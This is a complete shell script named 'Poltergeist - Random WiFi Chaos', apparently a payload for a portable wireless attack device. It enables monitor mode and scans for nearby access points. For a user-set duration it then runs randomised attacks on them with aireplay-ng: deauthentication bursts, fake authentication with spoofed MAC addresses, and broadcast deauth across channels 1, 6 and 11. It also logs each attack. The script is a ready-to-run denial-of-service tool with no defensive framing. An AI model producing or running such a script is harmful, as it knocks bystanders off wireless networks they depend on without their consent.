#!/bin/sh
# Title: Poltergeist - Random WiFi Chaos
# Author: NullSec
# Description: Unpredictable WiFi disruption attacks
# Category: WiFi Chaos

LOOT_DIR="/mmc/nullsec/poltergeist"
mkdir -p "$LOOT_DIR"

echo "👻 POLTERGEIST - RANDOM CHAOS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

echo -n "Chaos duration in seconds [180]: "
read DURATION
DURATION=${DURATION:-180}

echo ""
echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

LOG_FILE="$LOOT_DIR/chaos_$(date +%Y%m%d_%H%M).log"
echo "Poltergeist Chaos Log - $(date)" > "$LOG_FILE"

# Scan for targets
echo "[*] Scanning environment..."
timeout 15 airodump-ng "$MON_IF" -w /tmp/poltergeist --output-format csv 2>/dev/null &
sleep 15

# Build target list
grep -E "^[0-9A-F]{2}:" /tmp/poltergeist-01.csv 2>/dev/null | \
    awk -F',' '{print $1","$4","$14}' | head -20 > /tmp/targets.txt

TARGET_COUNT=$(wc -l < /tmp/targets.txt 2>/dev/null || echo 0)
echo "[+] Found $TARGET_COUNT potential targets"

echo ""
echo "[*] Unleashing Poltergeist..."
echo "[*] Duration: ${DURATION}s"
echo ""

END_TIME=$(($(date +%s) + DURATION))
ATTACK_COUNT=0

while [ $(date +%s) -lt $END_TIME ]; do
    # Pick random attack type
    ATTACK_TYPE=$((RANDOM % 4))
    
    # Pick random target
    TARGET_LINE=$(shuf -n1 /tmp/targets.txt 2>/dev/null)
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CH=$(echo "$TARGET_LINE" | cut -d',' -f2 | tr -d ' ')
    ESSID=$(echo "$TARGET_LINE" | cut -d',' -f3 | tr -d ' ')
    
    [ -z "$BSSID" ] && continue
    [ -z "$CH" ] && CH=$((RANDOM % 11 + 1))
    
    iwconfig "$MON_IF" channel $CH 2>/dev/null
    
    case $ATTACK_TYPE in
        0)
            # Deauth burst
            echo "[👻] Deauth burst -> $ESSID ($BSSID)"
            echo "$(date +%H:%M:%S) DEAUTH $BSSID" >> "$LOG_FILE"
            aireplay-ng -0 $((RANDOM % 20 + 5)) -a "$BSSID" "$MON_IF" 2>/dev/null &
            sleep 3
            ;;
        1)
            # Fake auth
            echo "[👻] Fake auth -> $ESSID ($BSSID)"
            echo "$(date +%H:%M:%S) FAKEAUTH $BSSID" >> "$LOG_FILE"
            FAKE_MAC=$(printf '02:%02X:%02X:%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
            timeout 5 aireplay-ng -1 0 -a "$BSSID" -h "$FAKE_MAC" "$MON_IF" 2>/dev/null &
            sleep 3
            ;;
        2)
            # Channel hop deauth
            echo "[👻] Channel hop attack"
            echo "$(date +%H:%M:%S) CHANNELHOP" >> "$LOG_FILE"
            for i in 1 6 11; do
                iwconfig "$MON_IF" channel $i 2>/dev/null
                aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
                sleep 1
            done
            ;;
        3)
            # Targeted client deauth (if clients visible)
            echo "[👻] Random interference"
            echo "$(date +%H:%M:%S) INTERFERENCE $BSSID" >> "$LOG_FILE"
            aireplay-ng -0 10 -a "$BSSID" "$MON_IF" 2>/dev/null &
            sleep 5
            ;;
    esac
    
    ATTACK_COUNT=$((ATTACK_COUNT + 1))
    killall aireplay-ng 2>/dev/null
    
    # Random pause
    sleep $((RANDOM % 3 + 1))
done

# Cleanup
killall aireplay-ng 2>/dev/null
airmon-ng stop "$MON_IF" >/dev/null 2>&1
rm -f /tmp/poltergeist* /tmp/targets.txt 2>/dev/null

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "👻 POLTERGEIST COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Attacks launched: $ATTACK_COUNT"
echo "Log: $LOG_FILE"
